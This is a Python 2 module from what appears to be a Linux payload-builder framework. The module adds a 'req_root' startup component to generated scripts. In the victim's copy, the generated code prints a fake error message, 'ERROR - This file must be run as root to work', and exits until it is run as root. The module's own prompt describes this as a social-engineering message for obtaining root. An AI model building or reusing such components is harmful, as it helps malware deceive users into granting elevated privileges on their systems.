# verified
import library.modules.config as config

config.main()


def main(option):
    if option == 'generate':
        config.import_statements.append('import os')
        config.startup.append('req_root_startup()')
        print config.war + 'Manual intervention required for req_root startup component'
        message = raw_input('\x1b[1m\x1b[37m[\x1b[0m\033[92m' +
                            '\x1b[1m\x1b[31mlinux/startup/req_root\x1b[0m' +
                            '\x1b[1m\x1b[37m > ]\x1b[0m ' + 'Social engineering message to display to the user to request for root [Enter for default message] : ')
        if not message:
            message = 'ERROR - This file must be run as root to work'
        config.functions.append('''
def req_root_startup():
    if os.getuid() == 0:
        return
    else:
        print "''' + message + '''"
        exit()
''')
    elif option == 'info':
        print '\nName             : Request root startup component' \
              '\nOS               : Linux' \
              '\nRequired Modules : os' \
              '\nCommands         : NIL (Runs at startup)' \
              '\nDescription      : Makes the script request for root before running\n'
